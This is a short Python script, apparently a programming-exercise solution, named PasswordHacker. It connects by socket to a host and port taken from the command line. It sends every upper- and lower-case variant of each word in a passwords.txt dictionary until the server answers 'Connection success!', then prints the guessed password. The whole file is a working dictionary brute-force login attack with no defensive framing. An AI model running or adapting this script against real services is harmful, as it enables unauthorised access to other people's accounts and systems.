import sys
import socket
import itertools


class PasswordHacker:
    def __init__(self):
        _args = sys.argv
        self.host = _args[1]
        self.port = int(_args[2])
        self.message = None
        self.client_socket = None
        self.server_response = None
        self.success = False
        self.eligible_password_chars = list(map(chr, range(97, 123))) + [str(num) for num in range(10)]
        self.main()

    def create_socket(self):
        _address = (self.host, self.port)
        self.client_socket = socket.socket()
        self.client_socket.connect(_address)

    def socket_send_recv(self):
        _binary_message = self.message.encode()
        self.client_socket.send(_binary_message)
        _response = self.client_socket.recv(1024)
        _response = _response.decode()
        return _response

    def close_socket(self):
        self.client_socket.close()

    def case_generator(self, _word):
        _cases_generator = itertools.product(*([letter.lower(), letter.upper()] for letter in _word))
        for generated_word in _cases_generator:
            yield ''.join(generated_word)

    def get_password_from_db(self):
        with open('passwords.txt', 'r') as file_reader:
            for _line in file_reader:
                yield _line.strip('\n')

    def main(self):
        self.create_socket()
        password_generator = self.get_password_from_db()
        for password in password_generator:
            word_in_cases_generator = self.case_generator(password)
            for word in word_in_cases_generator:
                self.message = word
                self.server_response = self.socket_send_recv()
                if self.server_response == "Connection success!":
                    self.success = True
                    break
            if self.success:
                break
        print(self.message)
        self.close_socket()


if __name__ == '__main__':
    PasswordHacker()
